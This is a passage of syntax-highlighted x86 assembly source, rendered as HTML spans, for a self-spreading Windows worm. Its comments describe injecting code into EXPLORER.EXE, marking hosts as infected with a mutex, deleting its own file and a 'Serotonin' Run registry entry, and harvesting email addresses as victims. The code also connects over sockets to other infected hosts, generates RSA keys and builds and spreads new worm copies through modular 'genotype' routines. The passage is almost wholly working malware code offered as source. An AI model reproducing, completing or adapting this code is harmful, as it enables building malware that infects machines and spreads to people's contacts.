</span><span class="sc5">_recv</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;get response from worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">err_gr</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">err_gr</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">                 </span><span class="sc1">;CF=0, everything OK</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">err_gr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">                 </span><span class="sc1">;CF=1, error occured</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;send ECX bytez from ESI PTR buffer via socket</span><span class="sc0">

</span><span class="sc5">write_socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;allocatez one page in worm's memory, EDI = address of page</span><span class="sc0">

</span><span class="sc5">alloc_page</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;EDI = uncommitted page to commit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_VirtualAlloc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;allocate another 4096 bytez for worm body</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;allocatez memory, size given by ECX, ZF set on error</span><span class="sc0">

</span><span class="sc5">alloc_memory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_VirtualAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;ZF=1, error occured</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;ZF=0, everything OK</span><span class="sc0">



</span><span class="sc1">;deallocatez allocated memory, ptr given by EAX</span><span class="sc0">

</span><span class="sc5">dealloc_memory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_VirtualFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;PROCEDURE  activate_gen</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;INPUT:</span><span class="sc0">
</span><span class="sc1">;   [ESP+4] -   genotype type</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;OUTPUT:</span><span class="sc0">
</span><span class="sc1">;   EAX -   result</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">


</span><span class="sc1">;callz genotype code, input in stack: genotype type</span><span class="sc0">

</span><span class="sc5">activate_gen</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ggdelta</span><span class="sc0">             </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">ggdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;(used by both of client &amp; server)</span><span class="sc0">

</span><span class="sc5">gen_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENOTYPE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ggdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get ptr to genotype</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get count of genz</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;to ECX</span><span class="sc0">
</span><span class="sc5">gen_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;get type of gen</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;compare it with argument</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_gen</span><span class="sc0">            </span><span class="sc1">;get next if not match</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">310Fh</span><span class="sc0">               </span><span class="sc1">;RDTCS</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;EDX=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;ECX=3</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;EDX = rnd &lt;0..2&gt;</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;decrement EDX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;restore counter</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ag_dispatch</span><span class="sc0">         </span><span class="sc1">;call code if EDX=0</span><span class="sc0">
</span><span class="sc5">n_gen</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;get to next gen</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_loop</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_start</span><span class="sc0">           </span><span class="sc1">;already passed down, start at beginning</span><span class="sc0">
</span><span class="sc5">next_gen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;restore counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_gen</span><span class="sc0">               </span><span class="sc1">;and continue...</span><span class="sc0">

</span><span class="sc5">ag_dispatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get relative ptr to code</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENOTYPE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ggdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;normalize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;ESI - ptr to GMHA</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ggdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;EDI - ptr to GPA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;dispatch genotype code</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;restore EBP</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;and quit (result is in EAX)</span><span class="sc0">
</span><span class="sc5">activate_gen</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;here starts implanted code which operatez in EXPLORER.EXE's address space</span><span class="sc0">

</span><span class="sc5">rtStart</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;__try block</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tgdelta</span><span class="sc0">             </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">tgdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;to EBP</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mutexName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CreateMutexA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;set already-infected mark</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;(create named mutex)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">60000</span><span class="sc0">
</span><span class="sc5">mut_sleep_time</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;mutable variable</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;wait 10 minutez</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;delete worm file</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'SHLWAPI'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get base address of SHLWAPI.DLL</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'SHDeleteValueA'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get address of SHDeleteValueA API</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'Serotonin'</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;delete registry record</span><span class="sc0">



    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_INITWORM</span><span class="sc0">            </span><span class="sc1">;activate initialization procedure</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;stored in worm genotype</span><span class="sc0">

    </span><span class="sc1">;create RSA private/public key pair</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wsock32_api</span><span class="sc0">         </span><span class="sc1">;get WSOCK32.dll API addresses</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt32_apiz</span><span class="sc0">            </span><span class="sc1">;get all needed crypto API addresses</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_create_context</span><span class="sc0">        </span><span class="sc1">;initialize crypt32.dll</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">install_server</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">



    </span><span class="sc1">;Find email addresses and store them in EXPLORER.EXE's heap</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_FINDVICTIMS</span><span class="sc0">         </span><span class="sc1">;activate victim-search engine</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;stored in worm genotype</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">install_server</span><span class="sc0">          </span><span class="sc1">;quit if error occured</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">heap_emailz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;save address of heap ( email addresses</span><span class="sc0">
                        </span><span class="sc1">;are stored there )</span><span class="sc0">
    </span><span class="sc1">;Initialize windows socketz</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wsa_startup</span><span class="sc0">         </span><span class="sc1">;initialize WSOCK32.DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">crypt32_destroy_worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_socket</span><span class="sc0">           </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wsa_destroy_worm</span><span class="sc0">        </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;correct socket handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save it</span><span class="sc0">


    </span><span class="sc1">;Find another worm in Internet</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_FINDWORM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;IPs found via genotype</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">connect_worm</span><span class="sc0">            </span><span class="sc1">;we got IP</span><span class="sc0">

    </span><span class="sc1">;Get pointer to IP storage (2nd part of manifest) and check it</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">eax.MAN_IPSPTR</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">eax.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ip_loop</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get IP to EAX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket_address</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sizeofsocket</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;try to connect</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">got_ip</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ip_loop</span><span class="sc0">             </span><span class="sc1">;disconnected, try another IP</span><span class="sc0">



    </span><span class="sc1">;No IP infected, create new worm, spread it and install worm server</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@ebx</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@ebx</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">worm_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_CREATEWORM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;create new worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spread_the_worm</span><span class="sc0">         </span><span class="sc1">;spread it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;and install server</span><span class="sc0">



</span><span class="sc1">;spread the worm by genotype code and delete worm file</span><span class="sc0">

